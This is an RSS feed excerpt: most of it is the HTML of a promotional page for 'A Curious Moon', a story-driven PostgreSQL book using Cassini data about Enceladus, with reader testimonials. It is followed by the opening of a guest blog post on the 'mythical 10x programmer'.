<div data-css="tve-u-171a8e493bc"><div data-css="tve-u-171a8e493bd"><div data-css="tve-u-171a8e493be"><div data-css="tve-u-171a8e493bf"><div data-css="tve-u-171a8e493c0"><p><span><img alt="" width="208" height="202" title="loren_stewart_200x" data-id="362" src="https://bigmachine.io/wp-content/uploads/2018/05/loren_stewart_200x.png" data-init-width="200" data-init-height="194" loading="lazy" data-css="tve-u-171a8e587bf" data-width="208" data-height="202" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/loren_stewart_200x.png?w=200&amp;ssl=1 200w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/loren_stewart_200x.png?resize=180%2C175&amp;ssl=1 180w" sizes="(max-width: 208px) 100vw, 208px"></span></p><p>&nbsp;<strong>Loren Steward</strong></p></div></div><div data-css="tve-u-171a8e493c3"><div data-css="tve-u-171a8e493c4"><p><span><img loading="lazy" alt="" width="217" height="170" title="Quotation_marks_image_03" data-id="41605" src="https://bigmachine.io/wp-content/uploads/tcb_content_templates/contentblock/images/Quotation_marks_image_03.png" data-css="tve-u-171a8e62de6" data-width="217" data-height="170" data-init-width="175" data-init-height="137"></span></p><p data-css="tve-u-171a8e67921"><em><strong>A Treasure Trove</strong></em></p><p data-css="tve-u-171a8e55e4f">"I’ve found the book to be a treasure trove of Postgres features. CTEs are blowing my mind right now. I’m a backend engineer, and I’ve been sharing what I’ve learned with my coworker who is a DBA. She is picking &nbsp;up some tips through me now! I haven’t found a good, engaging tutorial for these intermediate/advanced Postgres tricks, and "A Curious Moon" fills this gap. As a bonus, I’m also picking up some bash tips from the book."</p></div></div></div></div></div>
</div></div></div>
</div><div data-css="tve-u-168602fef0f" data-inherit-lp-settings="1">

<div data-css="tve-u-1686030115d"><p data-tag="h3" data-css="tve-u-168603280cf"><h3 data-css="tve-u-1686030ea3f">You'll dig in to some of the most amazing data of our lifetime...</h3></p><p data-css="tve-u-16860558abc">I won't waste your time with sleep-inducing demos and examples - we're going to <strong>hit the ground running</strong> by <strong>importing millions of records</strong> into PostgreSQL right from the command line and then we're going to interrogate it for correctness. From there we <strong>put our detective hats on</strong> and get to work.</p><div data-css="tve-u-171a8f8117e" tcb-template-name="Resource List 06" tcb-template-id="41686" tcb-template-pack="137" data-keep-css_id="1"><div data-css="tve-u-171a8f8117f">

<div data-css="tve-u-171a8f81180"><div data-css="tve-u-171a8fba418" tcb-template-name="Team 10" tcb-template-id="41907" data-keep-css_id="1"><div data-css="tve-u-171a8fba419">

<div data-css="tve-u-171a8fba41a"><div data-css="tve-u-171a8fba41c">

<div data-css="tve-u-171a8fba41d"><div data-css="tve-u-171a8fba41e"><div data-css="tve-u-171a8fba41f"><div><div data-css="tve-u-171a8fba420"><div data-css="tve-u-171a8fba421">

<div data-css="tve-u-171a8fba423"><div data-css="tve-u-171a9010f1a">

<div><p><span><img alt="" data-id="161826" width="800" data-init-width="800" height="575" data-init-height="575" title="14 copy" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/14-copy.png" srcset="https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?w=800&amp;ssl=1 800w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=300%2C216&amp;ssl=1 300w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=768%2C552&amp;ssl=1 768w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=247%2C178&amp;ssl=1 247w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=510%2C367&amp;ssl=1 510w" sizes="(max-width: 800px) 100vw, 800px"></span></p><p data-css="tve-u-171a900da73"><h3 data-css="tve-u-171a8fd31ac">Working with the PostgreSQL CLI</h3></p><p data-css="tve-u-16d9dc501ff"><strong>We don't have time for fluffy tooling!</strong> Yes there are GUIs and visual tools out there, but SQL with PostgreSQL is simple and easy to use when describing the precise table and index set that you want.</p></div>
</div></div>
</div></div></div><div><div data-css="tve-u-171a8fba432"><div data-css="tve-u-171a9ee5b8c">

<div><p><span><img alt="" data-id="161840" width="309" data-init-width="800" height="222" data-init-height="575" title="00-csvs" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/00-csvs.png" mt-d="-1" data-css="tve-u-171a905f8cb" data-width="309" data-height="222" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?w=800&amp;ssl=1 800w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=300%2C216&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=768%2C552&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=247%2C178&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=510%2C367&amp;ssl=1 510w" sizes="(max-width: 309px) 100vw, 309px"></span></p><p data-css="tve-u-171a9018c8d"><h3 data-css="tve-u-171a9018c8e">importing data from massive csv files</h3></p><p data-css="tve-u-171a906570f"><strong>You'll import data like a pro, using the command line and a Makefile.</strong> There are GUIs you could use, but here at Red:4 we believe in keeping things simple and powerful..</p></div>
</div></div></div><div><div><div data-css="tve-u-171a9ee473f">

<div><p><span><img alt="" data-id="161842" width="309" data-init-width="889" height="222" data-init-height="575" title="leapyear" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/leapyear.png" mt-d="-1" data-css="tve-u-171a9078bd8" data-width="309" data-height="222" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/leapyear.png?zoom=2&amp;resize=309%2C222&amp;ssl=1 618w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/leapyear.png?zoom=3&amp;resize=309%2C222&amp;ssl=1 927w" sizes="(max-width: 309px) 100vw, 309px"></span></p><p data-css="tve-u-171a9078bd9"><h3 data-css="tve-u-171a9078bda">WEEDING OUT THE INEVITABLE CRAP DATA</h3></p><p data-css="tve-u-171a9081ff7"><strong>You will become "data minded".</strong>You'll go through a basic audit process from real, raw data from JPL. It doesn't matter where the data is from, it will&nbsp;<em>always have errors</em>.</p></div>
</div></div></div></div></div></div>
</div></div>
</div></div></div>
</div><div data-css="tve-u-171a8f8117f">

<div data-css="tve-u-171a8f81180"><div data-css="tve-u-171a90bbfa7" tcb-template-name="Team 10" tcb-template-id="41907" data-keep-css_id="1"><div data-css="tve-u-171a8fba419">

<div data-css="tve-u-171a8fba41a"><div data-css="tve-u-171a8fba41c">

<div data-css="tve-u-171a8fba41d"><div data-css="tve-u-171a8fba41e"><div data-css="tve-u-171a8fba41f"><div><div data-css="tve-u-171a8fba420"><div data-css="tve-u-171a8fba421">

<div data-css="tve-u-171a8fba423"><div data-css="tve-u-171a9010f1a">

<div><p><span><img alt="" data-id="161844" width="1368" data-init-width="1368" height="916" data-init-height="916" title="shot_186" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?w=1368&amp;ssl=1 1368w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=300%2C201&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=1024%2C686&amp;ssl=1 1024w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=768%2C514&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=247%2C165&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=510%2C341&amp;ssl=1 510w" sizes="(max-width: 1368px) 100vw, 1368px"></span></p><p data-css="tve-u-171a900da73"><h3 data-css="tve-u-171a8fd31ac">TRIAGING AND SIZING UP WHAT THE DATA MEANS</h3></p><p data-css="tve-u-171a90c3a39"><span data-css="tve-u-1634af88282"><strong>You'll sleuth through raw Cassini data using basic queries</strong>. Pulling data in is only part of the process – looking for clues and understanding what you're seeing is the next step. To do this you'll use <strong>Common Table Expressions</strong>, <strong>Full Text Search</strong> indexing and <strong>Windowing Functions</strong>.</span></p></div>
</div></div>
</div></div></div><div><div data-css="tve-u-171a8fba432"><div data-css="tve-u-171a9018c8b">

<div><p><span><img alt="" data-id="161845" width="370" data-init-width="544" height="212" data-init-height="312" title="shot_187" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg" mt-d="0" data-css="tve-u-171a915ce14" data-width="370" data-height="212" ml-d="-4" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?w=544&amp;ssl=1 544w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?resize=300%2C172&amp;ssl=1 300w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?resize=247%2C142&amp;ssl=1 247w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?resize=510%2C293&amp;ssl=1 510w" sizes="(max-width: 370px) 100vw, 370px"></span></p><p data-css="tve-u-171a911509f"><h3 data-css="tve-u-171a9018c8e">OPTIMIZING QUERIES</h3></p><p data-css="tve-u-171a906570f"><strong>You'll speed up slow queries with built-in analysis tools</strong> and objects. The Cassini data dump is gigantic, and sifting through the analysis records can be time consuming! You'll use EXPLAIN and ANALYZE to figure out where to put your indexes and when it makes sense to build a materialized view, which is data cached on disk.</p></div>
</div></div></div><div><div><div data-css="tve-u-171a9078bd5">

<div><p><span><img alt="" data-id="161858" width="309" data-init-width="1058" height="233" data-init-height="798" title="shot_188" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg" mt-d="-4" data-css="tve-u-171a9154582" data-width="309" data-height="233" ml-d="0" srcset="https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?w=1058&amp;ssl=1 1058w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=300%2C226&amp;ssl=1 300w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=1024%2C772&amp;ssl=1 1024w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=768%2C579&amp;ssl=1 768w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=247%2C186&amp;ssl=1 247w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=510%2C385&amp;ssl=1 510w" sizes="(max-width: 309px) 100vw, 309px"></span></p><p data-css="tve-u-171a9078bd9"><h3 data-css="tve-u-171a9078bda">verifying what we have using sql</h3></p><p data-css="tve-u-171a9081ff7">NASA is a very thorough organization, but it's staffed by humans and humans like spreadsheets and <strong>spreadsheets destroy data</strong>. You'll use mathematical analysis to verify <strong>flyby altitudes and speeds</strong> using data from the INMS during the 22 close encounters with Enceladus.</p></div>
</div></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-171a91d3d1c" tcb-template-name="Call to Action 06" tcb-template-id="41514" data-keep-css_id="1"><div data-css="tve-u-171a91d3d1d">

<div><div data-css="tve-u-171a91d3d1e">

<div data-css="tve-u-171a91d3d20"><div data-css="tve-u-171a91d3d21"><div data-css="tve-u-171a91d3d22"><div data-css="tve-u-171a91d3d23"><div><p><span><img alt="" width="232" height="180" title="Image10017" data-id="161853" src="https://bigmachine.io/wp-content/uploads/2020/04/Image10017.png" data-init-width="946" data-init-height="733" loading="lazy" data-css="tve-u-171a91e5bbd" data-width="232" data-height="180" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?w=946&amp;ssl=1 946w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=300%2C232&amp;ssl=1 300w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=768%2C595&amp;ssl=1 768w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=247%2C191&amp;ssl=1 247w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=510%2C395&amp;ssl=1 510w" sizes="(max-width: 232px) 100vw, 232px"></span></p></div></div><div data-css="tve-u-171a91d3d25"><div data-css="tve-u-171a91d3d26"><p data-css="tve-u-171a91d3d27"><h3 data-css="tve-u-171a9206468">You'll run queries looking for the presence of life under this amazing moon.</h3></p><div data-css="tve-u-171a91d3d29"><p data-css="tve-u-171a91e4ce5"><span data-css="tve-u-1634af8827d"><strong>You'll finally perform the ultimate analysis on very real scientific data:&nbsp;<em>Is There Life Under the Ice of Enceladus?</em>&nbsp;&nbsp;</strong></span></p><p data-css="tve-u-171a91e4ce5"><span data-css="tve-u-1634af8827d"><strong></strong>You will have all the data you need to support this claim: thermal, chemical and mineralogical results from two of the most sensitive instruments humans have ever created. You'll run the query and see the results for yourself!</span></p></div></div></div></div></div></div>
</div></div>
</div></div></div></div>
</div></div></div>
</div><div data-css="tve-u-168604d64ed">

<div data-css="tve-u-168604e56fa"><p data-tag="h3" data-css="tve-u-1687a2f0c50"><h3>Working with data can be the most fun you've ever had at work.</h3></p><p>It's a discovery that most DBAs don't want "app devs" to know:&nbsp;<strong><em>working with data is intoxicating</em></strong>. Learning the skills you need to effectively work with data can be one of the <span data-css="tve-u-171a925f9eb">best investements in your career</span>... just ask these people...</p><div data-css="tve-u-1602b1ebd26" data-ct-name="Resume Clients" data-ct="testimonial-7342" data-element-name="Testimonial">

<div data-css="tve-u-16cdcc0fe5a"><div data-css="tve-u-16860547721"><div data-css="tve-u-16870ae36ee"><div><div data-css="tve-u-168605c3908"><div data-css="tve-u-1688010799d">

<div><div data-css="tve-u-16afdd5028d">

<div><div data-css="tve-u-16afdd58015"><div data-css="tve-u-16afdd0b596" data-float="1">

<div data-css="tve-u-1686061b5f0"><p><span><img alt="" width="400" height="400" title="tompkins" data-id="389" src="https://bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg" data-init-width="400" data-init-height="400" loading="lazy" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?w=400&amp;ssl=1 400w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=280%2C280&amp;ssl=1 280w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=100%2C100&amp;ssl=1 100w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=150%2C150&amp;ssl=1 150w" sizes="(max-width: 400px) 100vw, 400px"></span></p></div>
</div></div></div>
</div><div data-css="tve-u-168800e7098">

<div data-css="tve-u-16afd6a6c48"><p data-css="tve-u-168605f9847"><strong><strong><strong>Compulsively readable. Recommended.</strong></strong></strong></p><p data-css="tve-u-1686119f5bd">"Reading through&nbsp;<em>A Curious Moon</em>... It's like reading&nbsp;<em>The Martian</em>, only instead of trying to survive in the hostile environment of another planet, it's about trying to survive in the hostile environment of snarky DBAs. Compulsively readable. Recommended."</p></div>
</div></div>
</div></div></div><div><div data-css="tve-u-1687b353150"><div data-css="tve-u-1687091a411">

<div><div data-css="tve-u-16afdd5028d">

<div><div data-css="tve-u-16afdd58015"><div data-css="tve-u-16afdd0b596" data-float="1">

<div data-css="tve-u-1686061b5f0"><p><span><img alt="" width="400" height="400" title="meggan" data-id="386" src="https://bigmachine.io/wp-content/uploads/2018/05/meggan.jpg" data-init-width="400" data-init-height="400" loading="lazy" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?w=400&amp;ssl=1 400w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=280%2C280&amp;ssl=1 280w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=300%2C300&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=100%2C100&amp;ssl=1 100w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=150%2C150&amp;ssl=1 150w" sizes="(max-width: 400px) 100vw, 400px"></span></p></div>
</div></div></div>
</div><div data-css="tve-u-168800e8e1f">

<div data-css="tve-u-16afd6a80ba"><p data-css="tve-u-168605f9847"><strong><strong>I am&nbsp;<em>loving</em>&nbsp;the book!</strong></strong></p><p data-css="tve-u-17493010a6a">I am loving the book! The narrative format is like no other programming book I've ever read, and it's really keeping me engaged and interested. I've struggled in the past to keep pushing through programming books that are dry &amp; stock standard, but the characters in A Curious Moon make the book relatable and it makes me want to learn.</p></div>
</div></div>
</div></div></div><div data-css="tve-u-1749300e95c"><div data-css="tve-u-168605c5931"><div data-css="tve-u-1687b4daac8">

<div><div data-css="tve-u-16afdd5028d">

<div><div data-css="tve-u-16afdd58015"><div data-css="tve-u-16afdd0b596" data-float="1">

<div data-css="tve-u-1686061b5f0"><p><span><img alt="" width="210" height="210" title="george" data-id="402" src="https://bigmachine.io/wp-content/uploads/2018/05/george.jpg" data-init-width="210" data-init-height="210" loading="lazy" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?w=210&amp;ssl=1 210w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?resize=180%2C180&amp;ssl=1 180w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?resize=100%2C100&amp;ssl=1 100w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?resize=150%2C150&amp;ssl=1 150w" sizes="(max-width: 210px) 100vw, 210px"></span></p></div>
</div></div></div>
</div><div data-css="tve-u-1688037c1e9">

<div data-css="tve-u-16afd6a933b"><p data-css="tve-u-168605f9847"><strong>One of the best technical books I've ever read.</strong></p><p data-css="tve-u-1686119f5bd">"I really am enjoying this book! It is one of the best technical books I've ever read, and I read more than 40 books per year (technical and non-technical). What I like most about this book is that you mixed a sci-fi story with technical writing. It is like a novel for geeks!"<em></em></p></div>
</div></div>
</div></div></div></div></div></div>
</div></div>
</div><div>

<div data-css="tve-u-171a9df25e6"><div data-css="tve-u-171a9f9c219">

<div><p data-tag="h3" data-css="tve-u-16860dbc5e4"><h3 data-css="tve-u-171a9be5c3f">Wait are you serious? Enceladus? Possible life under its icy shell?</h3></p><p data-css="tve-u-168709e7e48">Yes, absolutely. Back in 2005 Cassini did a routine flyby of Enceladus, a moon that's about the size of Great Britain (313 mi in diameter). It's the most reflective body in the solar system, covered with smooth ice... except for its south pole...</p><div><div data-css="tve-u-171aa0692ac"><div><div><p><span><img alt="" data-id="161850" width="677" data-init-width="1000" height="694" data-init-height="1025" title="Image8807" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg" data-css="tve-u-171a9c34e97" data-width="677" data-height="694" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?w=1000&amp;ssl=1 1000w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=293%2C300&amp;ssl=1 293w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=768%2C787&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=247%2C253&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=510%2C523&amp;ssl=1 510w" sizes="(max-width: 677px) 100vw, 677px"></span></p></div></div><div><div><p data-css="tve-u-171a9ca6462">A Great Cosmic Mystery</p><div data-css="tve-u-171a9ca8f87"><p data-css="tve-u-171a9c7c9dd">Turns out this little moon gets squeezed between Jupiter and Titan and the <strong>gravitational pull grinds out some heat</strong> within its core. Heat that produces <strong>temperatures up <em>90 C</em></strong> in some spots, which look suspiciously like the deep water plumes we see here on Earth.</p><p data-css="tve-u-171a9c3f5d6">Oh, but it gets weirder...</p></div></div></div></div></div><p data-css="tve-u-171a9cb2eb5">The Bioreactor</p><div><div><div><div><div data-css="tve-u-171a9c3dd3f"><p data-css="tve-u-171a9c3f5d6">That heated water produces plumes at the moon's south pole which jet material into space. We didn't know what was in that material until 2007, when <strong>Cassini flew right through them</strong> at ridiculously high speeds and low elevation.</p><p data-css="tve-u-171a9c3f5d6">The onboard mass spectrometers scooped it up and... wouldn't ya know... it's <strong>sea water</strong>. <strong>There's a salty ocean under the ice</strong>&nbsp; and it containes <strong>methane</strong> and <strong>hydrocarbons</strong> that mirror the deep sea "chimneys" that we have here on Earth. This has led scientists to speculate that Enceladus is a <em>bioreactor</em>, capable of producing life in extraordinary circumstances.&nbsp;</p></div></div></div><div><div><p><span><img alt="" data-id="161849" width="677" data-init-width="627" height="694" data-init-height="531" title="Image8791" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/Image8791.jpg" data-css="tve-u-171a9c34e97" data-width="677" data-height="694" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8791.jpg?zoom=2&amp;resize=677%2C694&amp;ssl=1 1354w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8791.jpg?zoom=3&amp;resize=677%2C694&amp;ssl=1 2031w" sizes="(max-width: 677px) 100vw, 677px"></span></p></div></div></div></div><p><span><img alt="" data-id="161852" width="1317" data-init-width="1317" height="548" data-init-height="548" title="09" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/09.jpg" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?w=1317&amp;ssl=1 1317w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=300%2C125&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=1024%2C426&amp;ssl=1 1024w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=768%2C320&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=247%2C103&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=510%2C212&amp;ssl=1 510w" sizes="(max-width: 1317px) 100vw, 1317px"></span></p><div data-css="tve-u-171a9e37e81"><p>This little moon is quite small, about <strong>the size of Texas</strong>, yet it jets water out continuously into space. Some of it rains back down as fine ice particles, covering the surface and making it the most reflective body in the solar system. Some of it gets sucked back into Saturn itself, making Enceladus the only moon we know of that contributes matter back to its host planet.</p><p>And <strong>some of it goes into orbit, creating the "E ring" </strong>of Saturn which you see above. That ghostly blue glow, the second largest planetary ring in the solar system, was created entirely from the icy jets of Enceladus... which is <strong>way too small to contribute that much material</strong>.</p></div></div>
</div></div>
</div><div data-css="tve-u-171a9fdfad8">

<div data-css="tve-u-171a9d26e2f"><p data-css="tve-u-171a9d37687">What the hell is going on up there?</p><div data-css="tve-u-171a9f0fd95"><p>I don't know...&nbsp;<strong><em>you tell me</em>.</strong> We can speculate all day about aliens, sunken UFOs and Thor's hidden palace but you know what would be even better? Letting the data tell us what's going on.</p><p>That's what we do as data people: <strong>let the data tell us the story</strong>. It's all in there, and with Cassini's mission data we have <strong>a gigantic amount that we get to sift through for answers</strong>.</p><p>That&nbsp;<em>you get to sift through</em>. <strong>Buckle up</strong>! PostgreSQL is fun and all, but it's the data behind this story that's the fun part. When you're done with this story, you'll be able to run (and understand) one hell of an amazing database query. These results were dubbed a "<strong>smoking gun for life</strong> in the waters of Enceladus" by <em>NASA itself</em>.</p></div><p><span><img alt="" data-id="161876" width="1200" data-init-width="1200" height="718" data-init-height="718" title="Image12632 copy" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?w=1200&amp;ssl=1 1200w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=1024%2C613&amp;ssl=1 1024w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=768%2C460&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=247%2C148&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=510%2C305&amp;ssl=1 510w" sizes="(max-width: 1200px) 100vw, 1200px"></span></p><div data-css="tve-u-171a9e9683d" tcb-template-name="Call to Action 12" tcb-template-id="41889" data-keep-css_id="1"><div data-css="tve-u-171a9e9683e">

<div><div data-css="tve-u-171a9e96840"><div data-css="tve-u-171a9e96841"><div data-css="tve-u-171a9e96842"><div data-css="tve-u-171a9e96843"><p><span><img alt="" data-id="368" width="316" data-init-width="750" height="189" data-init-height="448" title="curious_slide" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg" data-width="316" data-height="189" srcset="https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?w=750&amp;ssl=1 750w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?resize=280%2C167&amp;ssl=1 280w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?resize=550%2C329&amp;ssl=1 550w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?resize=300%2C179&amp;ssl=1 300w" sizes="(max-width: 316px) 100vw, 316px"></span></p></div></div><div data-css="tve-u-171a9e96845"><div data-css="tve-u-171a9e96846"><p data-css="tve-u-171a9e96847"><h3 data-css="tve-u-171a9f14274">The most fun you'll have learning something new.</h3></p><p>Spend the weekend with Dee and the gang at Red:4, digging in to the planetary mystery of Enceladus.</p></div></div></div></div></div>
</div></div></div>
</div><div data-inherit-lp-settings="1" data-css="tve-u-16cdd4acc71">

<div data-css="tve-u-16cdd4acc80"><p data-tag="h2" data-css="tve-u-16899a6ae75"><h2>Frequently Asked Questions
</h2></p><div data-css="tve-u-16898db49ac"><div data-css="tve-u-16898db468a"><div><div data-css="tve-u-16899be2e7e"><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899be7319" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd402a"><strong>Is this a print or digital book?</strong>
</h4>
</div>

</div>
</div>
</div><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899be4c12" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd673c"><strong>Do I get any and all updates?&nbsp;</strong>
</h4>
</div>

</div>
</div>
</div></div></div><div><div><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899bf19eb" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd4f6a"><strong>Is this for real? You must have made some of this up?</strong></h4>
</div>

</div>
</div>
</div><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899bef9ab" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd7ef4">How can I get …</h4></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bigmachine.io/products/a-curious-moon/">https://bigmachine.io/products/a-curious-moon/</a></em></p>]]>
            </description>
            <link>https://bigmachine.io/products/a-curious-moon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149803</guid>
            <pubDate>Thu, 19 Nov 2020 14:29:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The mythical 10x programmer (repost)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149727">thread link</a>) | @sklivvz1971
<br/>
November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmers’ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
